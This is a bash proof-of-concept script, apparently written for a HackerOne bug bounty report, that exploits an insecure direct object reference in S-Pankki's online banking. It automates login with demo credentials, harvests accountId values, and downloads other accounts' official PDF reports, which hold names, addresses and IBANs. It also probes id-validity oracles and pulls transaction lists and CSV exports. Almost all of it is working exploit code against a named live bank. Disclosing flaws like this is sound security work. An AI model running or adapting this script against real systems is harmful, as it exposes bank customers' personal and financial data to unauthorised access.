#!/usr/bin/env bash
# S-Pankki e-banking — accountId IDOR: server-generated PDF report leak
# online.s-pankki.fi | demo user | UA @wearehackerone (HackerOne scope)
#
# Proves: GET /ebank/pad/fees/getReport.ds?accountId=<A>&year=<Y>
#         returns account <A>'s official PDF (name/address/IBAN/period/fees)
#         — decided by the URL parameter alone, tokenless plain GET, no Referer check.
#
# Usage: bash pad_report_idor.sh
set -u
BASE="https://online.s-pankki.fi"
UA="@wearehackerone"
JAR="$(mktemp /tmp/cjXXXX.txt)"
rm -f "$JAR"
OUT="$(mktemp -d /tmp/idorXXXX)"; trap 'rm -f "$JAR"' EXIT
echo "[*] out: $OUT"

code() { curl -sk -L -A "$UA" -b "$JAR" -c "$JAR" -o "$OUT/$1" -w '%{http_code}' -D "$OUT/$1.hdr" -m 40 "${@:2}"; }

# 1) login
echo "[1] login"
TOK=$(curl -sk -A "$UA" -c "$JAR" -o "$OUT/l1.html" -m 40 "$BASE/ebank/auth/initLogin.do?language=1" \
     | python3 -c 'import sys,re;m=re.search(r"name=\"org\.apache\.struts\.taglib\.html\.TOKEN\" value=\"([a-f0-9]{32})\"",sys.stdin.read());print(m.group(1) if m else "")')
curl -sk -A "$UA" -b "$JAR" -c "$JAR" -o /dev/null -m 40 -X POST "$BASE/ebank/auth/loginEbank.do" \
  --data-urlencode "org.apache.struts.taglib.html.TOKEN=$TOK" --data-urlencode "language=fi" \
  --data-urlencode "startPage=" --data-urlencode "sloanCampaignCode=" \
  --data-urlencode "username=12345678" --data-urlencode "password=123456" --data-urlencode "btn_log_in=Jatka"
for i in 1 2 3 4 5; do
  L=$(curl -sk -A "$UA" -b "$JAR" -c "$JAR" -o "$OUT/l2.html" -m 40 "$BASE/ebank/auth/initEbankSession.do" \
      | grep -oP 'URL="\K[^"]+' | head -1)
  [ -n "$L" ] && [ "${L#*initEbankSession}" != "$L" ] && curl -sk -A "$UA" -b "$JAR" -c "$JAR" -o "$OUT/l3.html" -m 40 "$L" && break
done
curl -sk -A "$UA" -b "$JAR" -c "$JAR" -o "$OUT/home.html" -m 40 "$BASE/ebank/menu/redirectByMenu.do?menuId=frontpage"

# 2) harvest accountIds from account pages (they sit in URLs on every account page:
#    account list, account detail, tx details, report, export — the leak surface)
echo "[2] harvest accountIds"
code "acctlist.html" "$BASE/ebank/menu/redirectByMenu.do?menuId=accounts_mnu_accounts" > /dev/null
code "pad.html" "$BASE/ebank/menu/redirectByMenu.do?menuId=accounts_mnu_pad" > /dev/null
grep -rhoP 'accountId=\K[0-9a-f]{64}' "$OUT/home.html" "$OUT/l3.html" "$OUT/acctlist.html" "$OUT/pad.html" 2>/dev/null | sort -u > "$OUT/accids.txt"
sort -u "$OUT/accids.txt" -o "$OUT/accids.txt"
mapfile -t ACCS < "$OUT/accids.txt"
echo "    found ${#ACCS[@]} accountId(s):"; printf '      %s\n' "${ACCS[@]:0:5}"
[ "${#ACCS[@]}" -ge 2 ] || { echo "    (need 2 demo accountIds; abort)"; exit 1; }
A=${ACCS[0]}; B=${ACCS[1]}

# 3) THE LEAK: request each account's PDF report via plain GET
for pair in "rpt_A:$A" "rpt_B:$B"; do
  n=${pair%%:*}; id=${pair#*:}
  c=$(code "$n.pdf" "$BASE/ebank/pad/fees/getReport.ds?accountId=$id&year=2025")
  ct=$(grep -i '^content-type' "$OUT/$n.pdf.hdr" | tr -d '\r')
  echo "[3] $n <- getReport.ds?accountId=${id:0:8}.. : HTTP $c, $ct, $(wc -c < "$OUT/$n.pdf") B"
done

# 4) URL-wins proof: set context to A, request B's report in URL
echo "[4] context=$A but URL=$B -> expect B's PDF"
code "ctxA.html" "$BASE/ebank/accountview/showAccountDetails.do?accountId=$A" > /dev/null
c=$(code "matrix_Actx_Burl.pdf" "$BASE/ebank/pad/fees/getReport.ds?accountId=$B&year=2025")
echo "    HTTP $c, $(wc -c < "$OUT/matrix_Actx_Burl.pdf") B (compare IBAN inside vs rpt_A.pdf)"

# 5) oracle: tamper 1 char of A -> expect 509B HTML error, NOT pdf, NOT 403
first="${A:0:1}"; rest="${A:1}"
[ "$first" = "0" ] && T="1$rest" || T="0$rest"
c=$(code "oracle_tampered.bin" "$BASE/ebank/pad/fees/getReport.ds?accountId=$T&year=2025")
echo "[5] oracle (1-char tamper): HTTP $c, $(wc -c < "$OUT/oracle_tampered.bin") B (valid=>PDF, invalid=>509B error)"

# 6) data chain follows the key: context=B -> fetchTransactionList.do (no params) -> B's data
echo "[6] context=B -> fetchTransactionList.do (no accountId param)"
code "ctxB.html" "$BASE/ebank/accountview/showAccountDetails.do?accountId=$B" > /dev/null
c=$(code "txlist_B.html" "$BASE/ebank/account/fetchTransactionList.do")
echo "    HTTP $c, $(wc -c < "$OUT/txlist_B.html") B, IBANs: $(grep -aoE 'FI[0-9]{2}([ 0-9]{4,})?' "$OUT/txlist_B.html" | sort -u | tr '\n' ' ')"

# 7) CSV export oracle (exact app URL from acc_transactionsExportLink.js:
#    cbs.contextPath + /api/account/transactions/exportRangedTransactions.ds)
#    valid empty range -> 200 CSV header row; valid range w/ data -> 302 (file flow);
#    invalid accountId  -> 200 ~56 KB error page
c=$(curl -sk -A "$UA" -b "$JAR" -c "$JAR" -o "$OUT/export_valid_empty.csv" -w '%{http_code}' -m 40 "$BASE/ebank/api/account/transactions/exportRangedTransactions.ds?accountId=$A&fromDate=01012025&toDate=31122025&fileType=sba-CSV")
echo "[7] export valid (empty range): HTTP $c, $(wc -c < "$OUT/export_valid_empty.csv") B -> $(head -c 90 "$OUT/export_valid_empty.csv" | tr '\n' ' ')"
c=$(curl -sk -A "$UA" -b "$JAR" -c "$JAR" -o "$OUT/export_invalid.bin" -w '%{http_code}' -m 40 "$BASE/ebank/api/account/transactions/exportRangedTransactions.ds?accountId=$(printf '0%.0s' {1..64})&fromDate=01012025&toDate=31122025&fileType=sba-CSV")
echo "    export invalid accountId : HTTP $c, $(wc -c < "$OUT/export_invalid.bin") B (error page)"

echo; echo "[*] open $OUT/rpt_A.pdf and $OUT/rpt_B.pdf — two different IBANs in the bank's official PDF, both from tokenless GETs."
